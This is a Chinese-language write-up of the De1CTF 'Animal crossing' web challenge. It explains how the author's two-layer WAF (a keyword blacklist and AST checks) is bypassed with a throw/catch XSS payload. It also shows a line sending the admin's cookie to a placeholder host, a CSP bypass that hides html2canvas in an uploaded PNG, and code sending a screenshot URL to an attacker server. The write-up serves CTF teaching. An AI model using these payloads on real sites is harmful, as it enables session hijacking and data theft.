# Animal crossing write up

题目描述：

免费创建护照来展示你的岛屿！


## 第一关：绕过云WAF

云WAF通常有好几层好几种过滤手段，这里我也是设计了了两层防护

### 第一层：黑名单检测

```go
var blackList = []string{
	//global
	"document", "window", "top", "parent", "global", "this",
	//func
	"console", "alert", "log", "promise", "fetch", "eval", "import",
	//char
	"<", ">", "`", "\\*", "&", "#", "%", "\\\\",
	//key
	"if", "set", "get", "with", "yield", "async", "wait", "func", "for", "error", "string",
	//string
	"href", "location", "url", "cookie", "src",
}
```

黑名单的绕过思路无非避开被ban的字符串和字符，这里因为go的iris框架问题（看不出来是golang吧），导致`;`后的东西会被删掉，可以用%0a绕过

### 第二层：静态语法分析

```
1. 将data传入`fmt.Sprintf("'%s';", data)`，然后进行语法解析，这里parse失败直接ban
2. 接着遍历AST进行分析：
   1. VariableExpression/AssignExpression，所有声明语句/赋值语句直接ban
   2. CallExpression，所有函数调用的，且callee不为Identifier的直接ban
      1. ban：`test.test()`、`a[x]()`
      2. pass：`test()`
   3. BracketExpression，也就是成员引用，Member不为Identifier的直接ban，
      1. ban：`a[1]`、`a['xx']`
      2. pass：`a[x]`
```

这一层waf，其实只要摸清ban的套路，针对性找到没被处理的语法来绕过即可，这里我的预期解是用throw传递变量，但是还有很多其他能用的语法（事实证明确实有很多

预期解payload：

```js
data=base64code'%0atry{throw 'ev'%2b'al'}catch(e){try{throw frames[e]}catch(c){c(atob(data))}}%0a//
```

绕过WAF的两层防护之后本地能成功alert就可以用

```js
location.href = "http://xxxx/?" + btoa(ducument.cookie) 
```

打到管理员cookie了，cookie中包含一半的flag：

```
FLAG=De1CTF{I_l1k4_
```



## 第二关：读取400张图片

另外一半flag，题目给了hint：

```
管理员在做什么?
```

读取管理员的document，会发现有400多张png图片，flag就藏在这些图片当中，这里设计的时候预设了下面几种解法：

1. 绕过CSP引入截图库，截图后把图片传到/upload，获取图片地址回传，然后下载图片
2. 用for循环把400个图全部传到/upload，获取400个图片地址然后回传
3. 直接读取图片回传，可以是写脚本一张一张传，也可以是用for循环批量传，但是回传过程需要编码转换，传回去后也需要再转成图片进行拼接

三种方法有简单的也有复杂的，国外三支队伍用的都是第三种，把所有图片dump出去（我猜大佬们没发现/upload接口 23333），而国内的选手用的是解法2，下面我详细介绍下绕过CSP引入截图库的解法，其他的方法也是类似，就不全写出来了（感兴趣的可以去看解出来的大佬们的wp）。

### 绕过CSP引入截图库

本题的主要功能是制造动森护照，主页是有一个上传文件接口的，利用/upload接口，可以上传任意png后缀的文件，然后用fetch读这个png文件，再eval一下，就可以绕过CSP引入html2canvas库并且执行了，上传的png文件如下

```js
	...
  ...
html2canvas.js代码
	...
  ...

// 截图->上传到upload->外传图片地址
html2canvas(document.body).then(function(canvas) {
        const form = new FormData(),
        url = "/upload",
        blob = new Blob([canvas.toDataURL().toString()], {type : "image/png"})
        file = new File([blob], "a.png")
        form.append("file", file)
        fetch(url, {
            method: "POST",
            body: form
        }).then(function(response) {
            return response.json()
        }).then(function(data) {
            location.href="//xxxxxxxxx:8099/?"+data.data.toString()
        })
  })
```

这里我把截图操作的js也写到png里了，主要思路就是截图完用/upload传到服务器，获取返回的图片地址回传给攻击者

### 读取图片并执行

把图片用/upload接口上传后，获取png地址，再用可控的js部分去读取这个图片再执行即可

读取并执行的代码如下：

```js
fetch(`/static/images/xxxxxxxxx.png`).then(res=>res.text()).then(txt=>eval(txt))
```

用绕过第一关的办法包装一下就可以了



最后提交到bot就能接收到管理员界面截图的地址了，直接下载就能看到另一半flag了

```
cool_GamE}
```

最后flag：

```
De1CTF{I_l1k4_cool_GamE}
```


